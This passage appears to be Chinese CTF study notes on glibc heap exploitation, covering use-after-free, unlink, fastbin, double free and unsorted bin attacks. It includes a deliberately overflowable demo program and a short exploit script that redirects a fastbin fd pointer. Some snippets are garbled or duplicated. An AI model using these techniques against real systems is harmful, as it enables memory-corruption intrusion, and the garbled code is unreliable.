title="_libc_malloc"></a>_libc_malloc</h3><p>_int_malloc()函数是 申请内存块的核心</p><p><strong>用户申请的字节一旦进入申请内存函数中就变成了无符号整数</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wapper for int_malloc</span></span><br><span class="line"><span class="keyword">void</span> *__libc_malloc(<span class="keyword">size_t</span> bytes) &#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="keyword">void</span> * victim;</span><br><span class="line">    <span class="comment">// 检查是否有内存分配钩子，如果有，调用钩子并返回.</span></span><br><span class="line">    <span class="keyword">void</span> *(*hook)(<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *) = atomic_forced_read(__malloc_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS(<span class="number">0</span>));</span><br></pre></td></tr></table></figure><h3 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h3><img src="/images/Heap/image-20200723124734877.png" alt="image-20200723124734877" style="zoom:150%;" /><h3 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="realloc_hook"></a>realloc_hook</h3><img src="/images/Heap/image-20200723124750043.png" alt="image-20200723124750043" style="zoom:200%;" /><h3 id="free-hook"><a href="#free-hook" class="headerlink" title="free_hook"></a>free_hook</h3><img src="/images/Heap/image-20200723124806785.png" alt="image-20200723124806785" style="zoom:200%;" /><h2 id="UAF-use-after-free"><a href="#UAF-use-after-free" class="headerlink" title="UAF(use after free)"></a>UAF(use after free)</h2><h3 id="原理-¶"><a href="#原理-¶" class="headerlink" title="原理 ¶"></a>原理 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/#_1" target="_blank" rel="noopener">¶</a></h3><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li><p>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</p></li><li><p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</p></li><li><p>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</p><p>  example:</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *myname;</span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, str); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">"call print my name\n"</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">"I can also use it"</span>;</span><br><span class="line">  a-&gt;func(<span class="string">"this is my function"</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">"I can also use it"</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">"this is my function"</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">    </span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"this pogram will crash...\n"</span>);</span><br><span class="line">  a-&gt;func(<span class="string">"can not be printed..."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"></span><br><span class="line">```cmd</span><br><span class="line">this is my <span class="function"><span class="keyword">function</span></span></span><br><span class="line">I can also <span class="keyword">use</span> it</span><br><span class="line"><span class="keyword">call</span> <span class="built_in">print</span> my <span class="keyword">name</span></span><br><span class="line">this pogram will crash...</span><br><span class="line">segmentation fault (core dumped）</span><br></pre></td></tr></table></figure></li></ul><p>​    </p><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p><img src="/images/Heap/2015112403492645777p1.jpg" alt="picture_p13"></p><p>将一个指针释放两次</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>unlink 的目的是把一个双向链表中的空闲块拿出来</p><p>free时和目前物理相邻的free chunk 进行何合并</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">unlink</span> 用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来，可能在以下地方使用</span><br><span class="line"></span><br><span class="line"><span class="symbol">malloc</span></span><br><span class="line">从恰好大小合适的 large <span class="keyword">bin </span>中获取 chunk。</span><br><span class="line">这里需要注意的是 fastbin 与 small <span class="keyword">bin </span>就没有使用 unlink，这就是为什么漏洞会经常出现在它们这里的原因。</span><br><span class="line">依次遍历处理 unsorted <span class="keyword">bin </span>时也没有使用 unlink 。</span><br><span class="line">从比请求的 chunk 所在的 <span class="keyword">bin </span>大的 <span class="keyword">bin </span>中取 chunk。</span><br><span class="line"><span class="symbol">free</span></span><br><span class="line">后向合并，合并物理相邻低地址空闲 chunk。</span><br><span class="line">前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</span><br><span class="line"><span class="symbol">malloc_consolidate</span></span><br><span class="line">后向合并，合并物理相邻低地址空闲 chunk。</span><br><span class="line">前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</span><br><span class="line"><span class="symbol">realloc</span></span><br><span class="line">前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。</span><br></pre></td></tr></table></figure><p><img src="/images/Heap/unlink_smallbin_intro.png" alt="img"></p><p><img src="/images/Heap/2015112403492885899p2-1586952827711.jpg" alt="picture_p14"></p><p>最初的unlink的实现,没有以下检查代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p>完整版unlink宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="comment">// unlink p</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    <span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);               \</span><br><span class="line">    FD = P-&gt;fd;                                                                      \</span><br><span class="line">    BK = P-&gt;bk;                                                                      \</span><br><span class="line">    <span class="comment">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;                                                                      \</span><br><span class="line">        FD-&gt;bk = BK;                                                              \</span><br><span class="line">        BK-&gt;fd = FD;                                                              \</span><br><span class="line">        <span class="comment">// 下面主要考虑 P 对应的 nextsize 双向链表的修改</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                              \</span><br><span class="line">            <span class="comment">// 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。</span></span><br><span class="line">            <span class="comment">// 那么其实也就没有必要对 nextsize 字段进行修改了。</span></span><br><span class="line">            <span class="comment">// 这里没有去判断 bk_nextsize 字段，可能会出问题。</span></span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                      \</span><br><span class="line">            <span class="comment">// 类似于小的 chunk 的检查思路</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">                               P, AV);                                              \</span><br><span class="line">            <span class="comment">// 这里说明 P 已经在 nextsize 链表中了。</span></span><br><span class="line">            <span class="comment">// 如果 FD 没有在 nextsize 链表中</span></span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                      \</span><br><span class="line">                <span class="comment">// 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P</span></span><br><span class="line">                <span class="comment">// 令 FD 为 nextsize 串起来的</span></span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      \</span><br><span class="line">                <span class="keyword">else</span> &#123;                                                              \</span><br><span class="line">                <span class="comment">// 否则我们需要将 FD 插入到 nextsize 形成的双链表中</span></span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              \</span><br><span class="line">                  &#125;                                                              \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                                              \</span><br><span class="line">                <span class="comment">// 如果在的话，直接拿走即可</span></span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      \</span><br><span class="line">              &#125;                                                                      \</span><br><span class="line">          &#125;                                                                      \</span><br><span class="line">      &#125;                                                                              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD=P-&gt;fd = target addr <span class="number">-12</span></span><br><span class="line">BK=P-&gt;bk = expect value</span><br><span class="line">FD-&gt;bk = BK，即 *(target addr<span class="number">-12</span>+<span class="number">12</span>)=BK=expect value</span><br><span class="line">BK-&gt;fd = FD，即 *(expect value +<span class="number">8</span>) = FD = target addr<span class="number">-12</span></span><br></pre></td></tr></table></figure><h3 id="当前的unlink"><a href="#当前的unlink" class="headerlink" title="当前的unlink"></a>当前的unlink</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br></pre></td></tr></table></figure><ul><li><p>FD-&gt;bk = target addr - 12 + 12=target_addr</p></li><li><p>BK-&gt;fd = expect value + 8</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ol><li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol></li></ul><p>效果 ： 使得指向UAF chunk的指针的地址为ptr-0x18</p><p>思路：</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>ptr处的指针会变为ptr-0x18</p><h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>free时的检查</p><p> 0.2*size_sz&lt;next chunksize&lt;sys memory</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用了fastbin的fd指针指向下一个chunk</p><p>fastbin 仅由一直指向最后一个chunk的指针fd，这个指针就决定了下一次要分配的chunk地址</p><p>在覆盖fd指针时候就可以实现向任意地址分配堆块</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>存在可被溢出的fastbin chunk 快 ，要求可以使chunk快的fd都能被控制</p><p>被分配的地址内容可控（存在size域） </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用过一定手段篡改某堆块的fd指向一块目标内存（当然其对应<span class="built_in">size</span>位置的值要合法），当我们<span class="built_in">malloc</span>到此堆块后再<span class="built_in">malloc</span>一次，自然就把目标内存分配到了，就可以对这块目标内存为所欲为了，达到任意地址写任意值的效果（可以是关键数据也可以是函数指针）</span><br></pre></td></tr></table></figure><h3 id="技巧点"><a href="#技巧点" class="headerlink" title="技巧点"></a>技巧点</h3><ul><li><p><strong>技巧①：</strong>我们malloc的时候，尽量malloc一个大小在0x70<del>0x80之间的堆块（因此malloc的参数要为0x60</del>0x70之间），因为这样我们的目标地址就会被放入0x70~0x80大小范围的fastbin链中，此时我们去构造堆块的时候，由于系统中0x7f这样的数值比较好找，所以能够构造0x7f这样的数值来跳过glibc的检测一</p></li><li><p><strong>技巧②：</strong>接着技巧①，如果此时我们没有数值为0x7f这样的地址来让我们构造，那么我们就需要使用借助unsortedbin attack了，利用unsortedbin attack向我们的目标地址处写入一个0x7f的数值（见文章：<a href="https://blog.csdn.net/qq_41453285/article/details/99329694）" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99329694）</a></p></li></ul><h3 id="覆盖fd指针实现利用"><a href="#覆盖fd指针实现利用" class="headerlink" title="覆盖fd指针实现利用"></a>覆盖fd指针实现利用</h3><p>当一个fastbin堆块存在堆溢出的时候，这种方法就可以使用了。简要的过程就是通过溢出覆盖一个在单链表中的chunk块的fd指针，当再次分配后（至少分配两次），就会在被覆盖的fd处分配fastbin chunk块，从而实现向任意地址分配堆块。当一个fastbin堆块存在堆溢出的时候，这种方法就可以使用了。简要的过程就是通过溢出覆盖一个在单链表中的chunk块的fd指针，当再次分配后（至少分配两次），就会在被覆盖的fd处分配fastbin chunk块，从而实现向任意地址分配堆块。</p><h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> BuforTst[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">void</span> *buf0,*buf1,*buf2,*buf3;</span><br><span class="line"> BuforTst[<span class="number">1</span>]=<span class="number">0x29</span>;</span><br><span class="line"> buf0=<span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"> buf1=<span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"normal chunk1,chunk2被分配\n"</span>);</span><br><span class="line"> <span class="built_in">free</span>(buf1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"free chunk2\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"break\n"</span>);<span class="comment">//for debug</span></span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>,buf0,<span class="number">64</span>);<span class="comment">//overflow</span></span><br><span class="line">    buf2=<span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">    buf3=<span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"发生溢出的chunk2被分配\n %p\n溢出改写的fd地址被分配\n"</span>,buf2,buf3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>demo2: 通过覆盖fd指针实现向bss段分配堆块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = zio(<span class="string">'./tst'</span>,timeout=<span class="number">999</span>)</span><br><span class="line">io.read_until(<span class="string">'break'</span>)</span><br><span class="line"></span><br><span class="line">sc=<span class="string">'a'</span>*<span class="number">32</span>+<span class="number">132</span>(<span class="number">0x0</span>)+<span class="number">132</span>(<span class="number">0x29</span>)+<span class="number">132</span>(<span class="number">0x804A060</span>)</span><br><span class="line">io.writeline(sc)</span><br><span class="line"><span class="comment">#io.sendline(sc)</span></span><br><span class="line">io.read()</span><br></pre></td></tr></table></figure><h3 id="house-of-spirit-free-实现任意地址利用"><a href="#house-of-spirit-free-实现任意地址利用" class="headerlink" title="house_of_spirit(free 实现任意地址利用)"></a>house_of_spirit(free 实现任意地址利用)</h3><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放到对应的fastbin链表中，从而达到分配指定地址的 chunk 的目的。</p><h3 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to  Stack"></a>Alloc to  Stack</h3><h3 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h3><h3 id="double-free-1"><a href="#double-free-1" class="headerlink" title="double free"></a>double free</h3><p>example(glibc2.26之前)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">首先申请大小相同的 a b c 两块，申请c 是为了避免重合到top于fastbin是单链表且LIFO，后释放的b被插入到链表头chunk 然后依次释放 a b a (因为搜索的顺序跟添加顺序相反)。此时fast bin里 b-&gt;a-&gt;null，然后再次释放a就会导致a-&gt;b-&gt;a</span><br><span class="line">由于fastbin是单链表且LIFO，后释放的b被插入到链表头，所以在再次<span class="built_in">free</span>(a)，由于此时bin头节点指向b</span><br><span class="line">这里注意的就是 在再次释放a的时候，因为b的fd指向null所以不进入搜索，b第一个进入搜索，所以只再次释放第一个结果，其余的都不再释放。</span><br></pre></td></tr></table></figure><p><img src="/images/Heap/fastbin_free_chunk3.png" alt="img"></p><p>glibc2.26后引入了tchache机制</p><h2 id="tcache-struct-attact"><a href="#tcache-struct-attact" class="headerlink" title="tcache_struct attact"></a>tcache_struct attact</h2><p>libc 2.7后新加的一个分配堆块的机制，但没有检查地址是否合法</p><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>BK = target -0x10(64 bit)</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><a href="https://www.anquanke.com/post/id/85127" target="_blank" rel="noopener">参考</a></p><p>堆在分配的时候，如果在申请的内存大小所对应的small bin或者large bin里面没有找到对应的chunk，此时会从unsorted bin里面去寻找chunk看是否存在合适的内存分配给用户，这个过程中会把unsorted bin链表给清空，清空的过程中没有进行检查，由此可能会发生任意地址可写。源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;  <span class="comment">//=</span></span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>当申请的堆块大于当前的top chunk size且小于用mmap分配的阈值时，系统会将原来的top chunk 放到unsorted bin中，同时分配新的较大的top chunk出来。</p><p>如果大于mmap分配的阈值，则直接从系统分配，源码如下：</p><p><img src="/images/Heap/t01946a32393555fbf5.png" alt="img"></p><p>所以为得到unsorted chunk，申请分配大内存需要大于top chunk的size且小于mmap的阈值</p><p>释放后将旧的top chunk放入到unsorted bin中的的代码如下：</p><p><a href="https://p4.ssl.qhimg.com/t01f58d0e161e8e0fad.png" target="_blank" rel="noopener"><img src="/images/Heap/t01f58d0e161e8e0fad.png" alt="http://p9.qhimg.com/t0102cb59a16c33a529.png"></a></p><p>不过在此之前，为了能让程序执行到这里，还需要通过一个检查：</p><p><a href="https://p0.ssl.qhimg.com/t012507b817ca7f4588.png" target="_blank" rel="noopener"><img src="/images/Heap/t012507b817ca7f4588.png" alt="http://p6.qhimg.com/t017dd19b992310956a.png"></a></p><p>检查总结起来为：</p><p>​    1,  size需要大于0x20(MINSIZE)</p><p>​    2,  pre_inuse位要为1</p><p>​    3，top chunk  address + top chunk size必须是页对齐的（页大小一般为0x1000）</p><p>所以分配内存时需要覆盖原来的top chunk size ，然后再申请一个比较大的堆块，这样就可以获得一个unsorted chunk</p><h4 id="构造更多的unsorted-chunk"><a href="#构造更多的unsorted-chunk" class="headerlink" title="构造更多的unsorted chunk"></a>构造更多的unsorted chunk</h4><p>如果只有一个unsorted chunk，是无法实现 attack的，所以需要构造更多的unsorted chunk，这一点可以通过覆盖刚刚加入到unsorted bin里面的chunk的后一个chunk的prev inuse位，这样在从这个unsorted chunk中申请出一个小的chunk后再释放掉的时候，就不会发生合并，即可实现构造更多的unsorted chunk。</p><h4 id="计算main-arena各个字段的距离"><a href="#计算main-arena各个字段的距离" class="headerlink" title="计算main_arena各个字段的距离"></a>计算main_arena各个字段的距离</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp=<span class="built_in">stderr</span>;</span><br><span class="line">    <span class="keyword">int</span> chain=&amp;(fp-&gt;_chain);</span><br><span class="line">    <span class="keyword">int</span> flags=&amp;(fp-&gt;_flags);</span><br><span class="line">    <span class="keyword">int</span> dis=chain-flags;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"FILE struct size: 0x%xn"</span>,<span class="keyword">sizeof</span>(FILE));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;chain - fp: 0x%x %xn"</span>,dis);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> mode=&amp;(fp-&gt;_mode);</span><br><span class="line">    dis=mode-flags;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;mode - fp: 0x%xn"</span>,dis);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> write_ptr=&amp;(fp-&gt;_IO_write_ptr);</span><br><span class="line">    